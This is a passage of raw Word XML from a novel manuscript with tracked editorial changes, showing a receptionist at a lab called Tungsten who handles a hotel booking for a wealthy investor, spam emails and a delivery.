      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> a restricted area. We work with scheduled substances here, not to mention volatile chemicals and potentially dangerous microorganisms…”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w:t>
      </w:r>
      <w:ins w:id="399" w:author="TextVet" w:date="2016-03-15T14:01:00Z">
        <w:r w:rsidR="0015686C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
        <w:r w:rsidR="00DC69E1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">s glare </w:t>
        </w:r>
        <w:r w:rsidR="0015686C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>froze</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="400" w:author="TextVet" w:date="2016-03-15T14:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0015686C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> shot</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> him</w:t>
      </w:r>
      <w:del w:id="401" w:author="TextVet" w:date="2016-03-15T14:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0015686C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> a look</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. “I’m fully aware of what you work with here. I’m the one that mails out the OSHA forms, remember? And I know all your safety protocols because I’m the one </w:t>
      </w:r>
      <w:commentRangeStart w:id="402"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>that</w:t>
      </w:r>
      <w:commentRangeEnd w:id="402"/>
      <w:r w:rsidR="00CD682B">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="402"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> prints your memos…”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woman sneered, “That’s great, but mailing forms and printing memos doesn’t make you a scientist.”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nodded. “You really should be back at the front desk.”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Tina’s gaze traveled from the two microbiologists, to the console, to the laboratory equipment, and finally to the floor. Biting her lip, she shuffled out of the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and, Tina?” the man called as she reached the doorway. “Could you please put in a thousand-unit rush order for 96-well microplates in polystyrene carbon black? Thanks.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:commentRangeStart w:id="403"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:smallCaps/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Tina’s desk occupied a brightly lit lobby</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:commentRangeEnd w:id="403"/>
      <w:r w:rsidR="008F26AB">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="403"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">between two sets of glass doors, both frosted with a large letter “W”, the chemical symbol for the element tungsten. Her black cardigan hung draped over her armless swivel chair. Like a pithed laboratory animal, she </w:t>
      </w:r>
      <w:ins w:id="404" w:author="TextVet" w:date="2016-03-15T14:59:00Z">
        <w:r w:rsidR="00E56831">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>crumpled</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="405" w:author="TextVet" w:date="2016-03-15T14:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E56831">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>dropped</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="406" w:author="TextVet" w:date="2016-03-15T14:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E56831">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">her body </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="407" w:author="TextVet" w:date="2016-03-15T14:58:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E56831">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>limply down</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="408" w:author="TextVet" w:date="2016-03-15T14:58:00Z">
        <w:r w:rsidR="00E56831">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="409" w:author="TextVet" w:date="2016-03-15T14:58:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E56831">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>o</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nto the pneumatic-spring seat and got back to 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Several </w:t>
      </w:r>
      <w:del w:id="410" w:author="TextVet" w:date="2016-03-15T15:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008A3557">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">new </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>email</w:t>
      </w:r>
      <w:del w:id="411" w:author="TextVet" w:date="2016-03-15T15:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008A3557">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> message</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:ins w:id="412" w:author="TextVet" w:date="2016-03-15T15:01:00Z">
        <w:r w:rsidR="00F372C6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">had </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="413" w:author="TextVet" w:date="2016-03-15T15:02:00Z">
        <w:r w:rsidR="00F372C6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>land</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="414" w:author="TextVet" w:date="2016-03-15T15:01:00Z">
        <w:r w:rsidR="008A3557">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed in</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="415" w:author="TextVet" w:date="2016-03-15T15:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008A3557">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>greeted her in</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> her Thunderbird inbox. Only one, however, was significant: a rare note of validation from her boss involving the imminent babysitting of some hotshot international gazillionaire.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: “Dr. Piotr Passinsky”</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; Christina, have you finalized arrangements for </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; visiting investor? Remember this man is head of the</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; consortium that funds this company. He will be coming</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; with many assistants. Spare no expense.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt; </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt; I booked reservations with the Medina Gallante hotel,</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt; Dr. P. Forwarding you the confirmation email...</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; From: “Medina Gallante Luxury Suites”</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; Thank you for choosing to stay at the Medina Gallante!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; We are proud to offer our guests the finest upscale </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; accommodations in the Pacific Northwest.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; Party name: IVAN ZHELEZNOV</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; Room assignment: PRESIDENTIAL SUITE</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; To make your travel experience as enjoyable as possible,</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; we offer the following enhanced transportation options</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; to and from our facilities.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; * Helicopter chauffeur from Sea-Tac airport direct to</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; our rooftop helipad</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; * Water taxi from any Lake Washington marina to our </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; private pier</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; Please let us know if you wish to take advantage of these</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; amenities, or if there is any other way we can improve</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;&gt; your visit.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt; Will this do, Dr. P?</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>This is acceptable.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It wasn’t exactly an Employee of the Year award, but Tina knew it was the closest thing to praise </w:t>
      </w:r>
      <w:del w:id="416" w:author="TextVet" w:date="2016-03-15T15:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A24CDC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">that </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">she </w:t>
      </w:r>
      <w:ins w:id="417" w:author="TextVet" w:date="2016-03-15T15:03:00Z">
        <w:r w:rsidR="00A24CDC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>would</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="418" w:author="TextVet" w:date="2016-03-15T15:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A24CDC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>was</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> likely </w:t>
      </w:r>
      <w:del w:id="419" w:author="TextVet" w:date="2016-03-15T15:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A24CDC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">to </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>get.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rest of the emails were pure spam. Solicitations from some web design company called Prismatic Creations cluttered her inbox, each with a colorful logo plastered across the top. They gave some spiel about updating Tungsten’s “corporate identity” to give the company a fresh look-and-feel </w:t>
      </w:r>
      <w:commentRangeStart w:id="420"/>
      <w:ins w:id="421" w:author="TextVet" w:date="2016-03-15T15:04:00Z">
        <w:r w:rsidR="0049219A">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to better resonate</w:t>
      </w:r>
      <w:ins w:id="422" w:author="TextVet" w:date="2016-03-15T15:05:00Z">
        <w:r w:rsidR="0049219A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>”</w:t>
        </w:r>
        <w:commentRangeEnd w:id="420"/>
        <w:r w:rsidR="0049219A">
          <w:rPr>
            <w:rStyle w:val="CommentReference"/>
          </w:rPr>
          <w:commentReference w:id="420"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> with today’s competitive blah blah</w:t>
      </w:r>
      <w:ins w:id="423" w:author="TextVet" w:date="2016-03-15T15:05:00Z">
        <w:r w:rsidR="00852E57">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blah. After reading one, she deleted them without a second thought.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With her inbox clear, she un-minimized her Facebook window. Her friend Natalie had posted some photos of a dreamcatcher that she’d woven from her own hair. Tina </w:t>
      </w:r>
      <w:ins w:id="424" w:author="TextVet" w:date="2016-03-15T15:06:00Z">
        <w:r w:rsidR="009C5AB8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>flicked</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="425" w:author="TextVet" w:date="2016-03-15T15:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009C5AB8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>gave</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> her scroll</w:t>
      </w:r>
      <w:ins w:id="426" w:author="TextVet" w:date="2016-03-15T15:06:00Z">
        <w:r w:rsidR="002D15CA">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wheel</w:t>
      </w:r>
      <w:del w:id="427" w:author="TextVet" w:date="2016-03-15T15:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009C5AB8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> a flick</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, and sank into a status-update-reading trance. Seconds or hours drifted mindlessly by.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When duty called again, it took the form of a FedEx man carrying a cardboard box the size of a suitcase. A small green light above the front door card-reader lit up as she buzzed him in. The package was from Newegg.com. It was addressed to Roger Tanner.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cringed, and felt the taste of sour milk welling up in her throat.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00B66F7C" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="428" w:author="TextVet" w:date="2016-03-15T15:08:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Taking</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="429" w:author="TextVet" w:date="2016-03-15T15:08:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00B66F7C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>She picked up</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> her iPhone</w:t>
      </w:r>
      <w:ins w:id="430" w:author="TextVet" w:date="2016-03-15T15:08:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, she</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="431" w:author="TextVet" w:date="2016-03-15T15:08:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00B66F7C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="432" w:author="TextVet" w:date="2016-03-15T15:09:00Z">
        <w:r w:rsidR="000B5D1B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>command</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="433" w:author="TextVet" w:date="2016-03-15T15:09:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="000B5D1B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>will</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ed her fingers to type</w:t>
      </w:r>
      <w:del w:id="434" w:author="TextVet" w:date="2016-03-15T15:08:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="000B5D1B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
